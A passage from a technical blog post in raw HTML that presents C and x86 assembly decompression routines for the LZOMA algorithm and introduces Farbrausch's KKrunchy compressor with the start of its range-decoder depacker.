#333333;\">=</span> <span style=\"color: #0000DD; font-weight: bold;\">0</span>;                             \n        x     <span style=\"color: #333333;\">=</span> <span style=\"color: #0000DD; font-weight: bold;\">256</span>;                           \n        res   <span style=\"color: #333333;\">=</span> <span style=\"color: #333333;\">*</span>c.src<span style=\"color: #333333;\">++</span>;                      \n        \n        <span style=\"color: #008800; font-weight: bold;\">for</span>(;;) {\n          x <span style=\"color: #333333;\">+=</span> x;\n          <span style=\"color: #008800; font-weight: bold;\">if</span>(x <span style=\"color: #333333;\">&gt;=</span> (total <span style=\"color: #333333;\">+</span> top)) {\n            x <span style=\"color: #333333;\">-=</span> total;\n            <span style=\"color: #008800; font-weight: bold;\">if</span>(res <span style=\"color: #333333;\">&gt;=</span> x) { \n              cf <span style=\"color: #333333;\">=</span> get_bit(<span style=\"color: #333333;\">&amp;</span>c);\n              res <span style=\"color: #333333;\">=</span> (res <span style=\"color: #333333;\">&lt;&lt;</span> <span style=\"color: #0000DD; font-weight: bold;\">1</span>) <span style=\"color: #333333;\">+</span> cf;\n              res <span style=\"color: #333333;\">-=</span> x;\n            }\n            <span style=\"color: #008800; font-weight: bold;\">break</span>;\n          }      \n          <span style=\"color: #888888;\">// magic?</span>\n          <span style=\"color: #008800; font-weight: bold;\">if</span>(x <span style=\"color: #333333;\">&amp;</span> (<span style=\"color: #005588; font-weight: bold;\">0x002FFE00</span> <span style=\"color: #333333;\">&lt;&lt;</span> <span style=\"color: #0000DD; font-weight: bold;\">1</span>)) {\n            top <span style=\"color: #333333;\">=</span> (((top <span style=\"color: #333333;\">&lt;&lt;</span> <span style=\"color: #0000DD; font-weight: bold;\">3</span>) <span style=\"color: #333333;\">+</span> top) <span style=\"color: #333333;\">&gt;&gt;</span> <span style=\"color: #0000DD; font-weight: bold;\">3</span>);\n          }\n          <span style=\"color: #008800; font-weight: bold;\">if</span>(res <span style=\"color: #333333;\">&lt;</span> top) <span style=\"color: #008800; font-weight: bold;\">break</span>;\n          \n          ofs <span style=\"color: #333333;\">-=</span> top;\n          total <span style=\"color: #333333;\">+=</span> top;\n          top <span style=\"color: #333333;\">&lt;&lt;=</span> <span style=\"color: #0000DD; font-weight: bold;\">1</span>;\n          cf <span style=\"color: #333333;\">=</span> get_bit(<span style=\"color: #333333;\">&amp;</span>c);\n          res <span style=\"color: #333333;\">=</span> (res <span style=\"color: #333333;\">&lt;&lt;</span> <span style=\"color: #0000DD; font-weight: bold;\">1</span>) <span style=\"color: #333333;\">+</span> cf;\n        }\n        ofs <span style=\"color: #333333;\">+=</span> res <span style=\"color: #333333;\">+</span> <span style=\"color: #0000DD; font-weight: bold;\">1</span>;\n        <span style=\"color: #888888;\">// long length?</span>\n        <span style=\"color: #008800; font-weight: bold;\">if</span>(ofs <span style=\"color: #333333;\">&gt;=</span> <span style=\"color: #0000DD; font-weight: bold;\">5400</span>) len<span style=\"color: #333333;\">++</span>;\n        <span style=\"color: #888888;\">// huge length?</span>\n        <span style=\"color: #008800; font-weight: bold;\">if</span>(ofs <span style=\"color: #333333;\">&gt;=</span> <span style=\"color: #005588; font-weight: bold;\">0x060000</span>) len<span style=\"color: #333333;\">++</span>;\n        <span style=\"color: #888888;\">// negate</span>\n        ofs <span style=\"color: #333333;\">=-</span> ofs;\n      }\n      \n      <span style=\"color: #008800; font-weight: bold;\">if</span>(get_bit(<span style=\"color: #333333;\">&amp;</span>c)) {\n        len <span style=\"color: #333333;\">+=</span> <span style=\"color: #0000DD; font-weight: bold;\">2</span>;\n        res <span style=\"color: #333333;\">=</span> <span style=\"color: #0000DD; font-weight: bold;\">0</span>;\n        <span style=\"color: #008800; font-weight: bold;\">for</span>(;;) { \n          cf <span style=\"color: #333333;\">=</span> get_bit(<span style=\"color: #333333;\">&amp;</span>c);\n          res <span style=\"color: #333333;\">=</span> (res <span style=\"color: #333333;\">&lt;&lt;</span> <span style=\"color: #0000DD; font-weight: bold;\">1</span>) <span style=\"color: #333333;\">+</span> cf;\n          <span style=\"color: #008800; font-weight: bold;\">if</span>(<span style=\"color: #333333;\">!</span>get_bit(<span style=\"color: #333333;\">&amp;</span>c)) <span style=\"color: #008800; font-weight: bold;\">break</span>;\n          res<span style=\"color: #333333;\">++</span>;\n        }\n        len <span style=\"color: #333333;\">+=</span> res;\n      } <span style=\"color: #008800; font-weight: bold;\">else</span> {\n        cf <span style=\"color: #333333;\">=</span> get_bit(<span style=\"color: #333333;\">&amp;</span>c); \n        len <span style=\"color: #333333;\">+=</span> cf;\n      }\n      ptr <span style=\"color: #333333;\">=</span> out <span style=\"color: #333333;\">+</span> ofs;\n      <span style=\"color: #008800; font-weight: bold;\">while</span>(<span style=\"color: #333333;\">--</span>len) <span style=\"color: #333333;\">*</span>out<span style=\"color: #333333;\">++</span> <span style=\"color: #333333;\">=</span> <span style=\"color: #333333;\">*</span>ptr<span style=\"color: #333333;\">++</span>;\n    }\n}\n</pre>\n</div>\n<p>The assembly code doesn&#8217;t transfer that well on to x86. It does, however, avoid having to use lots of RAM, which is a plus.</p>\n<div class=\"highlight\" style=\"background: #ffffff;\">\n<pre style=\"line-height: 125%;\"><span></span><span style=\"color: #000000;\">lzoma_depack:</span>\n<span style=\"color: #000000;\">_lzoma_depack:</span>\n    <span style=\"color: #000000;\">pushad</span>                   <span style=\"color: #177500;\">; save all registers</span>\n    <span style=\"color: #000000;\">lea</span>    <span style=\"color: #A90D91;\">esi</span>, [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">32</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">4</span>]\n    <span style=\"color: #000000;\">lodsd</span>\n    <span style=\"color: #000000;\">xchg</span>   <span style=\"color: #A90D91;\">edi</span>, <span style=\"color: #A90D91;\">eax</span>          <span style=\"color: #177500;\">; edi = outbuf</span>\n    <span style=\"color: #000000;\">lodsd</span>\n    <span style=\"color: #000000;\">xchg</span>   <span style=\"color: #A90D91;\">ebp</span>, <span style=\"color: #A90D91;\">eax</span>          <span style=\"color: #177500;\">; ebp = inlen</span>\n    <span style=\"color: #000000;\">add</span>    <span style=\"color: #A90D91;\">ebp</span>, <span style=\"color: #A90D91;\">edi</span>          <span style=\"color: #177500;\">; ebp += out</span>\n    <span style=\"color: #000000;\">lodsd</span>\n    <span style=\"color: #000000;\">xchg</span>   <span style=\"color: #A90D91;\">esi</span>, <span style=\"color: #A90D91;\">eax</span>          <span style=\"color: #177500;\">; esi = inbuf</span>\n    <span style=\"color: #000000;\">pushad</span>                   <span style=\"color: #177500;\">; save esi, edi and ebp</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #000000;\">init_getbit</span>\n<span style=\"color: #000000;\">get_bit:</span>\n    <span style=\"color: #000000;\">add</span>    <span style=\"color: #A90D91;\">eax</span>, <span style=\"color: #A90D91;\">eax</span>          <span style=\"color: #177500;\">; c-&gt;w &lt;&lt;= 1</span>\n    <span style=\"color: #000000;\">jnz</span>    <span style=\"color: #000000;\">exit_getbit</span>       <span style=\"color: #177500;\">; if(c-&gt;w == 0)</span>\n    <span style=\"color: #000000;\">lodsd</span>                    <span style=\"color: #177500;\">; x = *(uint32_t*)c-&gt;src;</span>\n    <span style=\"color: #000000;\">adc</span>    <span style=\"color: #A90D91;\">eax</span>, <span style=\"color: #A90D91;\">eax</span>          <span style=\"color: #177500;\">; c-&gt;w = (x &lt;&lt; 1) | 1;</span>\n<span style=\"color: #000000;\">exit_getbit:</span>\n    <span style=\"color: #000000;\">ret</span>                      <span style=\"color: #177500;\">; return x &gt;&gt; 31;</span>\n<span style=\"color: #000000;\">init_getbit:</span>\n    <span style=\"color: #000000;\">pop</span>    <span style=\"color: #A90D91;\">ebp</span>               <span style=\"color: #177500;\">; ebp = &amp;get_bit</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">eax</span>, <span style=\"color: #1C01CE;\">1</span> <span style=\"color: #000000;\">&lt;&lt;</span> <span style=\"color: #1C01CE;\">31</span>      <span style=\"color: #177500;\">; c-&gt;w = 1 &lt;&lt; 31</span>\n    <span style=\"color: #000000;\">cdq</span>                      <span style=\"color: #177500;\">; ofs = -1</span>\n    <span style=\"color: #000000;\">movsb</span>                    <span style=\"color: #177500;\">; *out++ = *src++;</span>\n    <span style=\"color: #000000;\">xor</span>    <span style=\"color: #A90D91;\">ecx</span>, <span style=\"color: #A90D91;\">ecx</span>          <span style=\"color: #177500;\">; len = 0</span>\n    <span style=\"color: #000000;\">jmp</span>    <span style=\"color: #000000;\">main_loop</span>\n<span style=\"color: #000000;\">copy_byte:</span>\n    <span style=\"color: #000000;\">movsb</span>                    <span style=\"color: #177500;\">; *out++ = *c.src++;</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">cl</span>, <span style=\"color: #1C01CE;\">2</span>             <span style=\"color: #177500;\">; len = 2</span>\n<span style=\"color: #000000;\">main_loop:</span>\n    <span style=\"color: #000000;\">xor</span>    <span style=\"color: #A90D91;\">ebx</span>, <span style=\"color: #A90D91;\">ebx</span>          <span style=\"color: #177500;\">; res = 0</span>\n    \n    <span style=\"color: #177500;\">; while(out &lt; end)</span>\n    <span style=\"color: #000000;\">cmp</span>    <span style=\"color: #A90D91;\">edi</span>, [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+pushad_t._ebp</span>]\n    <span style=\"color: #000000;\">jnb</span>    <span style=\"color: #000000;\">lzoma_exit</span>\n    \n    <span style=\"color: #177500;\">; for(;;) {</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #A90D91;\">ebp</span>               <span style=\"color: #177500;\">; cf = get_bit(&amp;c);</span>\n    <span style=\"color: #000000;\">jnc</span>    <span style=\"color: #000000;\">copy_byte</span>         <span style=\"color: #177500;\">; if(cf) break;</span>\n    \n    <span style=\"color: #177500;\">; unpack lz</span>\n    <span style=\"color: #000000;\">jecxz</span>  <span style=\"color: #000000;\">skip_lz</span>           <span style=\"color: #177500;\">; if(len) {</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #A90D91;\">ebp</span>               <span style=\"color: #177500;\">;   cf = get_bit(&amp;c);</span>\n<span style=\"color: #000000;\">skip_lz:</span>                     <span style=\"color: #177500;\">; }</span>\n    <span style=\"color: #177500;\">; carry?</span>\n    <span style=\"color: #000000;\">jnc</span>    <span style=\"color: #000000;\">use_last_offset</span>   <span style=\"color: #177500;\">; if(cf) {</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">cl</span>, <span style=\"color: #1C01CE;\">3</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">2</span>           <span style=\"color: #177500;\">;   len = 3</span>\n    <span style=\"color: #000000;\">pushad</span>                   <span style=\"color: #177500;\">;   </span>\n    <span style=\"color: #177500;\">; total = out - (uint8_t*)outbuf</span>\n    <span style=\"color: #000000;\">sub</span>    <span style=\"color: #A90D91;\">edi</span>, [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">32</span><span style=\"color: #000000;\">+pushad_t._edi</span>] \n    <span style=\"color: #177500;\">; top = ((total &lt;= 400000) ? 60 : 50;</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">cl</span>, <span style=\"color: #1C01CE;\">50</span>\n    <span style=\"color: #000000;\">cmp</span>    <span style=\"color: #A90D91;\">edi</span>, <span style=\"color: #1C01CE;\">400000</span>\n    <span style=\"color: #000000;\">ja</span>     <span style=\"color: #000000;\">skip_upd</span>\n    <span style=\"color: #000000;\">add</span>    <span style=\"color: #A90D91;\">cl</span>, <span style=\"color: #1C01CE;\">10</span>\n<span style=\"color: #000000;\">skip_upd:</span>\n    <span style=\"color: #000000;\">xor</span>    <span style=\"color: #A90D91;\">ebp</span>, <span style=\"color: #A90D91;\">ebp</span>          <span style=\"color: #177500;\">; ofs = 0</span>\n    <span style=\"color: #000000;\">xor</span>    <span style=\"color: #A90D91;\">edx</span>, <span style=\"color: #A90D91;\">edx</span>          <span style=\"color: #177500;\">; x = 256</span>\n    <span style=\"color: #000000;\">inc</span>    <span style=\"color: #A90D91;\">dh</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">bl</span>, <span style=\"color: #A90D91;\">byte</span>[<span style=\"color: #A90D91;\">esi</span>]     <span style=\"color: #177500;\">; res = *c.src++</span>\n    <span style=\"color: #000000;\">inc</span>    <span style=\"color: #A90D91;\">esi</span>\n<span style=\"color: #000000;\">find_loop:</span>                   <span style=\"color: #177500;\">; for(;;) {</span>\n    <span style=\"color: #000000;\">add</span>    <span style=\"color: #A90D91;\">edx</span>, <span style=\"color: #A90D91;\">edx</span>          <span style=\"color: #177500;\">;   x += x;</span>\n    <span style=\"color: #177500;\">; if(x &gt;= (total + top)) {</span>\n    <span style=\"color: #000000;\">push</span>   <span style=\"color: #A90D91;\">edi</span>               <span style=\"color: #177500;\">; save total</span>\n    <span style=\"color: #000000;\">add</span>    <span style=\"color: #A90D91;\">edi</span>, <span style=\"color: #A90D91;\">ecx</span>          <span style=\"color: #177500;\">; edi = total + top</span>\n    <span style=\"color: #000000;\">cmp</span>    <span style=\"color: #A90D91;\">edx</span>, <span style=\"color: #A90D91;\">edi</span>          <span style=\"color: #177500;\">; cf = (x - (total + top)) </span>\n    <span style=\"color: #000000;\">pop</span>    <span style=\"color: #A90D91;\">edi</span>               <span style=\"color: #177500;\">; restore total</span>\n    <span style=\"color: #000000;\">jb</span>     <span style=\"color: #000000;\">upd_len3</span>          <span style=\"color: #177500;\">; jump if x is &lt; (total + top)</span>\n    \n    <span style=\"color: #000000;\">sub</span>    <span style=\"color: #A90D91;\">edx</span>, <span style=\"color: #A90D91;\">edi</span>          <span style=\"color: #177500;\">; x -= total;</span>\n    <span style=\"color: #000000;\">cmp</span>    <span style=\"color: #A90D91;\">ebx</span>, <span style=\"color: #A90D91;\">edx</span>          <span style=\"color: #177500;\">; if(res &gt;= x) {</span>\n    <span style=\"color: #000000;\">jb</span>     <span style=\"color: #000000;\">upd_len2</span>          <span style=\"color: #177500;\">; jump if res &lt; x</span>\n    \n    <span style=\"color: #177500;\">; cf = get_bit(&amp;c);</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #A90D91;\">dword</span>[<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+pushad_t._ebp</span>]\n    <span style=\"color: #000000;\">adc</span>    <span style=\"color: #A90D91;\">ebx</span>, <span style=\"color: #A90D91;\">ebx</span>          <span style=\"color: #177500;\">; res = (res &lt;&lt; 1) + cf;</span>\n    <span style=\"color: #000000;\">sub</span>    <span style=\"color: #A90D91;\">ebx</span>, <span style=\"color: #A90D91;\">edx</span>          <span style=\"color: #177500;\">; res -= x;</span>\n    <span style=\"color: #000000;\">jmp</span>    <span style=\"color: #000000;\">upd_len2</span>\n<span style=\"color: #000000;\">upd_len3:</span>\n    <span style=\"color: #177500;\">; magic?</span>\n    <span style=\"color: #177500;\">; if(x &amp; (0x002FFE00 &lt;&lt; 1)) {</span>\n    <span style=\"color: #000000;\">test</span>   <span style=\"color: #A90D91;\">edx</span>, (<span style=\"color: #1C01CE;\">0x002FFE00</span> <span style=\"color: #000000;\">&lt;&lt;</span> <span style=\"color: #1C01CE;\">1</span>)\n    <span style=\"color: #000000;\">jz</span>     <span style=\"color: #000000;\">upd_len4</span>\n    \n    <span style=\"color: #177500;\">; top = (((top &lt;&lt; 3) + top) &gt;&gt; 3);</span>\n    <span style=\"color: #000000;\">lea</span>    <span style=\"color: #A90D91;\">ecx</span>, [<span style=\"color: #A90D91;\">ecx</span><span style=\"color: #000000;\">+</span><span style=\"color: #A90D91;\">ecx</span><span style=\"color: #000000;\">*</span><span style=\"color: #1C01CE;\">8</span>]\n    <span style=\"color: #000000;\">shr</span>    <span style=\"color: #A90D91;\">ecx</span>, <span style=\"color: #1C01CE;\">3</span>\n<span style=\"color: #000000;\">upd_len4:</span>\n    <span style=\"color: #000000;\">cmp</span>    <span style=\"color: #A90D91;\">ebx</span>, <span style=\"color: #A90D91;\">ecx</span>          <span style=\"color: #177500;\">; if(res &lt; top) break;</span>\n    <span style=\"color: #000000;\">jb</span>     <span style=\"color: #000000;\">upd_len2</span>\n    \n    <span style=\"color: #000000;\">sub</span>    <span style=\"color: #A90D91;\">ebp</span>, <span style=\"color: #A90D91;\">ecx</span>          <span style=\"color: #177500;\">; ofs -= top</span>\n    <span style=\"color: #000000;\">add</span>    <span style=\"color: #A90D91;\">edi</span>, <span style=\"color: #A90D91;\">ecx</span>          <span style=\"color: #177500;\">; total += top</span>\n    <span style=\"color: #000000;\">add</span>    <span style=\"color: #A90D91;\">ecx</span>, <span style=\"color: #A90D91;\">ecx</span>          <span style=\"color: #177500;\">; top &lt;&lt;= 1</span>\n    \n    <span style=\"color: #177500;\">; cf = get_bit(&amp;c);</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #A90D91;\">dword</span>[<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+pushad_t._ebp</span>]\n    \n    <span style=\"color: #177500;\">; res = (res &lt;&lt; 1) + cf;</span>\n    <span style=\"color: #000000;\">adc</span>    <span style=\"color: #A90D91;\">ebx</span>, <span style=\"color: #A90D91;\">ebx</span>\n    <span style=\"color: #000000;\">jmp</span>    <span style=\"color: #000000;\">find_loop</span>\n<span style=\"color: #000000;\">upd_len2:</span>\n    <span style=\"color: #177500;\">; ofs = (ofs + res + 1);</span>\n    <span style=\"color: #000000;\">lea</span>    <span style=\"color: #A90D91;\">ebp</span>, [<span style=\"color: #A90D91;\">ebp</span> <span style=\"color: #000000;\">+</span> <span style=\"color: #A90D91;\">ebx</span> <span style=\"color: #000000;\">+</span> <span style=\"color: #1C01CE;\">1</span>]\n\n    <span style=\"color: #177500;\">; if(ofs &gt;= 5400) len++;</span>\n    <span style=\"color: #000000;\">cmp</span>    <span style=\"color: #A90D91;\">ebp</span>, <span style=\"color: #1C01CE;\">5400</span>\n    <span style=\"color: #000000;\">sbb</span>    <span style=\"color: #A90D91;\">dword</span>[<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+pushad_t._ecx</span>], <span style=\"color: #1C01CE;\">0</span>\n    \n    <span style=\"color: #177500;\">; if(ofs &gt;= 0x060000) len++;</span>\n    <span style=\"color: #000000;\">cmp</span>    <span style=\"color: #A90D91;\">ebp</span>, <span style=\"color: #1C01CE;\">0x060000</span>\n    <span style=\"color: #000000;\">sbb</span>    <span style=\"color: #A90D91;\">dword</span>[<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+pushad_t._ecx</span>], <span style=\"color: #1C01CE;\">0</span>\n    \n    <span style=\"color: #000000;\">neg</span>    <span style=\"color: #A90D91;\">ebp</span>               <span style=\"color: #177500;\">; ofs = -ofs;</span>\n    \n    <span style=\"color: #000000;\">mov</span>    [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+pushad_t._edx</span>], <span style=\"color: #A90D91;\">ebp</span> <span style=\"color: #177500;\">; save ofs in edx</span>\n    <span style=\"color: #000000;\">mov</span>    [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+pushad_t._esi</span>], <span style=\"color: #A90D91;\">esi</span>\n    <span style=\"color: #000000;\">mov</span>    [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+pushad_t._eax</span>], <span style=\"color: #A90D91;\">eax</span>\n    <span style=\"color: #000000;\">popad</span>                    <span style=\"color: #177500;\">; restore registers</span>\n<span style=\"color: #000000;\">use_last_offset:</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #A90D91;\">ebp</span>               <span style=\"color: #177500;\">; if(get_bit(&amp;c)) {</span>\n    <span style=\"color: #000000;\">jnc</span>    <span style=\"color: #A90D91;\">ch</span><span style=\"color: #000000;\">eck_two</span>\n    \n    <span style=\"color: #000000;\">add</span>    <span style=\"color: #A90D91;\">ecx</span>, <span style=\"color: #1C01CE;\">2</span>            <span style=\"color: #177500;\">; len += 2</span>\n<span style=\"color: #000000;\">upd_len:</span>                     <span style=\"color: #177500;\">; for(res=0;;res++) {</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #A90D91;\">ebp</span>               <span style=\"color: #177500;\">; cf = get_bit(&amp;c);</span>\n    <span style=\"color: #000000;\">adc</span>    <span style=\"color: #A90D91;\">ebx</span>, <span style=\"color: #A90D91;\">ebx</span>          <span style=\"color: #177500;\">; res = (res &lt;&lt; 1) + cf;</span>\n    \n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #A90D91;\">ebp</span>               <span style=\"color: #177500;\">; if(!get_bit(&amp;c)) break;</span>\n    <span style=\"color: #000000;\">jnc</span>    <span style=\"color: #000000;\">upd_lenx</span>\n    \n    <span style=\"color: #000000;\">inc</span>    <span style=\"color: #A90D91;\">ebx</span>               <span style=\"color: #177500;\">; res++;</span>\n    <span style=\"color: #000000;\">jmp</span>    <span style=\"color: #000000;\">upd_len</span>\n<span style=\"color: #000000;\">upd_lenx:</span>\n    <span style=\"color: #000000;\">add</span>    <span style=\"color: #A90D91;\">ecx</span>, <span style=\"color: #A90D91;\">ebx</span>          <span style=\"color: #177500;\">; len += res</span>\n    <span style=\"color: #000000;\">jmp</span>    <span style=\"color: #000000;\">copy_bytes</span>\n<span style=\"color: #000000;\">check_two:</span>                   <span style=\"color: #177500;\">; } else {</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #A90D91;\">ebp</span>               <span style=\"color: #177500;\">;   cf = get_bit();</span>\n    <span style=\"color: #000000;\">adc</span>    <span style=\"color: #A90D91;\">ecx</span>, <span style=\"color: #A90D91;\">ebx</span>          <span style=\"color: #177500;\">;   len += cf</span>\n<span style=\"color: #000000;\">copy_bytes:</span>                  <span style=\"color: #177500;\">; }</span>\n    <span style=\"color: #000000;\">push</span>   <span style=\"color: #A90D91;\">esi</span>               <span style=\"color: #177500;\">; save c.src pointer</span>\n    <span style=\"color: #000000;\">lea</span>    <span style=\"color: #A90D91;\">esi</span>, [<span style=\"color: #A90D91;\">edi</span> <span style=\"color: #000000;\">+</span> <span style=\"color: #A90D91;\">edx</span>]  <span style=\"color: #177500;\">; ptr = out + ofs</span>\n    <span style=\"color: #000000;\">dec</span>    <span style=\"color: #A90D91;\">ecx</span>\n    <span style=\"color: #177500;\">; while(--len) *out++ = *ptr++;</span>\n    <span style=\"color: #000000;\">rep</span>    <span style=\"color: #000000;\">movsb</span>\n    <span style=\"color: #000000;\">pop</span>    <span style=\"color: #A90D91;\">esi</span>               <span style=\"color: #177500;\">; restore c.src</span>\n    <span style=\"color: #000000;\">jmp</span>    <span style=\"color: #000000;\">main_loop</span>\n<span style=\"color: #000000;\">lzoma_exit:</span>\n    <span style=\"color: #000000;\">popad</span>                    <span style=\"color: #177500;\">; free()</span>\n    <span style=\"color: #000000;\">popad</span>                    <span style=\"color: #177500;\">; restore registers</span>\n    <span style=\"color: #000000;\">ret</span>\n</pre>\n</div>\n<h2 id=\"kkrunchy\">12.7 KKrunchy</h2>\n<p>Designed by <a href=\"https://twitter.com/rygorous\">Fabian Giesen</a> for the demo group, <a href=\"http://www.farbrausch.com/\">Farbrausch</a>, KKrunchy comprises two algorithms. The first, developed between 2003 and 2005, is an LZ77 variant with an arithmetic coder <a href=\"http://www.farbrausch.de/~fg/kkrunchy/\">published in 2006</a>. The second algorithm developed between 2006 and 2008, borrows ideas from <a href=\"http://mattmahoney.net/dc/paq.html\">PAQ7</a> and was published in 2011. Both are slow at compression but acceptable for demo productions and are compact for decompression. Fabian <a href=\"https://fgiesen.wordpress.com/2011/01/24/x86-code-compression-in-kkrunchy/\">describes both in more detail here</a>, including the <a href=\"http://www.farbrausch.com/~fg/code/disfilter/\">&#8220;secret ingredient&#8221;</a> that can improve ratios of 64K intros by up to 10%. In 2011, Farbrausch members <a href=\"https://github.com/farbrausch/fr_public\">published source code</a> for their demo productions made between 2001-2011, including both compressors. A 32-Bit x86 decoder is already available from Fabian. There appears to be a buffer overflow in the compressor that goes unnoticed without address sanitizer. Here&#8217;s an alternate version of the <a href=\"https://github.com/farbrausch/fr_public/blob/master/kkrunchy/depacker_simple.cpp\">simple depacker</a> used as a reference.</p>\n<div class=\"highlight\" style=\"background: #ffffff;\">\n<pre style=\"line-height: 125%;\"><span></span><span style=\"color: #557799;\">#ifdef linux</span>\n<span style=\"color: #888888;\">// gcc</span>\n<span style=\"color: #557799;\">#define REV(x) __builtin_bswap32(x)</span>\n<span style=\"color: #557799;\">#else</span>\n<span style=\"color: #888888;\">// msvc</span>\n<span style=\"color: #557799;\">#define REV(x) _byteswap_ulong(x)</span>\n<span style=\"color: #557799;\">#endif</span>\n\n<span style=\"color: #008800; font-weight: bold;\">typedef</span> <span style=\"color: #008800; font-weight: bold;\">struct</span> _fr_state {\n    <span style=\"color: #008800; font-weight: bold;\">const</span> <span style=\"color: #333399; font-weight: bold;\">uint8_t</span> <span style=\"color: #333333;\">*</span>src;\n    <span style=\"color: #888888;\">// range decoder values</span>\n    <span style=\"color: #333399; font-weight: bold;\">uint32_t</span> val, len, pbs[<span style=\"color: #0000DD; font-weight: bold;\">803</span>];\n} fr_state;\n\n<span style=\"color: #888888;\">// decode a bit using range decoder</span>\n<span style=\"color: #008800; font-weight: bold;\">static</span> <span style=\"color: #333399; font-weight: bold;\">int</span> <span style=\"color: #0066BB; font-weight: bold;\">DB</span>(\n  fr_state <span style=\"color: #333333;\">*</span>s, <span style=\"color: #333399; font-weight: bold;\">int</span> idx, <span style=\"color: #333399; font-weight: bold;\">uint32_t</span> flag) \n{\n    <span style=\"color: #333399; font-weight: bold;\">uint32_t</span> a, b, c, d, e;\n\n    a <span style=\"color: #333333;\">=</span> s<span style=\"color: #333333;\">-&gt;</span>pbs[idx];\n    b <span style=\"color: #333333;\">=</span> (s<span style=\"color: #333333;\">-&gt;</span>len <span style=\"color: #333333;\">&gt;&gt;</span> <span style=\"color: #0000DD; font-weight: bold;\">11</span>) <span style=\"color: #333333;\">*</span> a;\n    c <span style=\"color: #333333;\">=</span> (s<span style=\"color: #333333;\">-&gt;</span>val <span style=\"color: #333333;\">&gt;=</span> b);\n    d <span style=\"color: #333333;\">=</span> <span style=\"color: #333333;\">-</span>c; e <span style=\"color: #333333;\">=</span> c<span style=\"color: #333333;\">-</span><span style=\"color: #0000DD; font-weight: bold;\">1</span>;\n    s<span style=\"color: #333333;\">-&gt;</span>len <span style=\"color: #333333;\">=</span> (d <span style=\"color: #333333;\">&amp;</span> s<span style=\"color: #333333;\">-&gt;</span>len) <span style=\"color: #333333;\">|</span> (e <span style=\"color: #333333;\">&amp;</span> b);\n    a <span style=\"color: #333333;\">=</span> (d <span style=\"color: #333333;\">&amp;</span> a) <span style=\"color: #333333;\">|</span> (e <span style=\"color: #333333;\">&amp;</span> <span style=\"color: #333333;\">-</span>a <span style=\"color: #333333;\">+</span> <span style=\"color: #0000DD; font-weight: bold;\">2048</span>);\n    a <span style=\"color: #333333;\">&gt;&gt;=</span> (<span style=\"color: #0000DD; font-weight: bold;\">5</span> <span style=\"color: #333333;\">-</span> flag);\n    s<span style=\"color: #333333;\">-&gt;</span>pbs[idx] <span style=\"color: #333333;\">+=</span> (a <span style=\"color: #333333;\">^</span> d) <span style=\"color: #333333;\">+</span> c;\n    d <span style=\"color: #333333;\">&amp;=</span> b;\n    s<span style=\"color: #333333;\">-&gt;</span>val <span style=\"color: #333333;\">-=</span> d; s<span style=\"color: #333333;\">-&gt;</span>len <span style=\"color: #333333;\">-=</span> d;\n    a <span style=\"color: #333333;\">=</span> (s<span style=\"color: #333333;\">-&gt;</span>len <span style=\"color: #333333;\">&gt;&gt;</span> <span style=\"color: #0000DD; font-weight: bold;\">24</span>);\n    a <span style=\"color: #333333;\">=</span> a <span style=\"color: #333333;\">==</span> <span style=\"color: #0000DD; font-weight: bold;\">0</span> <span style=\"color: #333333;\">?</span> <span style=\"color: #333333;\">-</span><span style=\"color: #0000DD; font-weight: bold;\">1</span> <span style=\"color: #333333;\">:</span> <span style=\"color: #0000DD; font-weight: bold;\">0</span>;\n    b <span style=\"color: #333333;\">=</span> (a <span style=\"color: #333333;\">&amp;</span> <span style=\"color: #005588; font-weight: bold;\">0xFF</span>) <span style=\"color: #333333;\">&amp;</span> <span style=\"color: #333333;\">*</span>s<span style=\"color: #333333;\">-&gt;</span>src;\n    d <span style=\"color: #333333;\">=</span> <span style=\"color: #333333;\">-</span>a;\n    s<span style=\"color: #333333;\">-&gt;</span>src <span style=\"color: #333333;\">+=</span> d;\n    s<span style=\"color: #333333;\">-&gt;</span>val <span style=\"color: #333333;\">=</span> (s<span style=\"color: #333333;\">-&gt;</span>val <span style=\"color: #333333;\">&lt;&lt;</span> (d <span style=\"color: #333333;\">&lt;&lt;</span> <span style=\"color: #0000DD; font-weight: bold;\">3</span>)) <span style=\"color: #333333;\">|</span> b;\n    s<span style=\"color: #333333;\">-&gt;</span>len <span style=\"color: #333333;\">=</span> (s<span style=\"color: #333333;\">-&gt;</span>len <span style=\"color: #333333;\">&lt;&lt;</span> (d <span style=\"color: #333333;\">&lt;&lt;</span> <span style=\"color: #0000DD; font-weight: bold;\">3</span>));\n    <span style=\"color: #008800; font-weight: bold;\">return</span> c;\n}\n\n<span style=\"color: #888888;\">// decode tree</span>\n<span style=\"color: #008800; font-weight: bold;\">static</span> <span style=\"color: #333399; font-weight: bold;\">int</span> <span style=\"color: #0066BB; font-weight: bold;\">DT</span>(\n  fr_state <span style=\"color: #333333;\">*</span>s, <span style=\"color: #333399; font-weight: bold;\">int</span> p, <span style=\"color: #333399; font-weight: bold;\">int</span> bits) \n{\n    <span 